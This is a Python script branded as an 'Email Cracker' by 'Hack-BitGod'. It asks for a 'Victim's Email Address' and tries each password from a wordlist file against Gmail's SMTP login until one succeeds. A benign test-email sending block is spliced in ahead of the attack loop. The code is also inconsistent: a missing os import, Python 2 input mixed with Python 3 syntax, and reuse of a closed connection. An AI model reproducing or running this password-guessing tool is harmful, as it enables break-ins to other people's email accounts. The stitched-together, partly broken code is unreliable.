class color:
    def __init__(self):
        self.END = '\033[0m'
        self.BOLD = '\033[1m'
        self.YELLOW = '\033[93m'

fa = color()

logo = fa.YELLOW + fa.BOLD + r'''
  _____ __  __    _    ___ _        ____ ____      _    ____ _  _______ ____  
 | ____|  \/  |  / \  |_ _| |      / ___|  _ \    / \  / ___| |/ / ____|  _ \ 
 |  _| | |\/| | / _ \  | || |     | |   | |_) |  / _ \| |   | ' /|  _| | |_) |
 | |___| |  | |/ ___ \ | || |___  | |___|  _ <  / ___ \ |___| . \| |___|  _ < 
 |_____|_|  |_/_/   \_\___|_____|  \____|_| \_\/_/   \_\____|_|\_\_____|_| \_\ 
                                                                         v1.0
Coded By : Hack-BitGod  
''' + fa.END

Prompt = fa.BOLD + "BitGod@Hack-BitGod:" + fa.END

print(logo)
print(Prompt)

import smtplib
import time 
import logging 
 
class bcolors:
    OK = '\033[92m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    ENDC = '\033[0m'
    UNDERLINE = '\033[4m'

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def connect_to_smtp_server():
    retries = 5
    for i in range(retries):
        try:
            smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
            smtpserver.ehlo()
            smtpserver.starttls()
            logging.info("SMTP connection established successfully.")
            return smtpserver
        except (smtplib.SMTPConnectError, smtplib.SMTPServerDisconnected) as e:
            logging.error(f"Attempt {i+1}/{retries} failed: {e}")
            time.sleep(5)  # Wait for 5 seconds before retrying
    raise Exception("Failed to connect to the SMTP server after several attempts.")

try:
    smtpserver = connect_to_smtp_server()
    
    email_user = os.getenv('EMAIL_USER')
    email_pass = os.getenv('EMAIL_PASS')
    
    smtpserver.login(email_user, email_pass)
    logging.info("Logged in successfully.")
    
    from_addr = email_user
    to_addr = "recipient_email@gmail.com"
    subject = "Test Email"
    body = "This is a test email."
    msg = f"Subject: {subject}\n\n{body}"
    
    smtpserver.sendmail(from_addr, to_addr, msg)
    logging.info("Email sent successfully.")
    
    smtpserver.quit()
    logging.info("SMTP server connection closed.")
except smtplib.SMTPAuthenticationError as auth_err:
    logging.error(f"Authentication failed: {auth_err}")
except smtplib.SMTPException as smtp_err:
    logging.error(f"SMTP error occurred: {smtp_err}")
except Exception as e:
    logging.error(f"An unexpected error occurred: {e}")
 
print (bcolors.BOLD + "HackBitGod Email Cracker" + bcolors.ENDC)
print (bcolors.BOLD + "TRYING WITH PASSWORDS IN: psw.list" + bcolors.ENDC)
 
user = raw_input("Enter The Victim's Email Address: ")
passwfile = "psw.list"
passwfile = open(passwfile, "r")
 
for password in passwfile:
	try:
		smtpserver.login(user, password)
		print (bcolors.UNDERLINE + "Password Found: %s"  % password + bcolors.ENDC)
		break;
	except smtplib.SMTPAuthenticationError:
		print (bcolors.FAIL + "Password Incorrect: %s" % password + bcolors.ENDC)
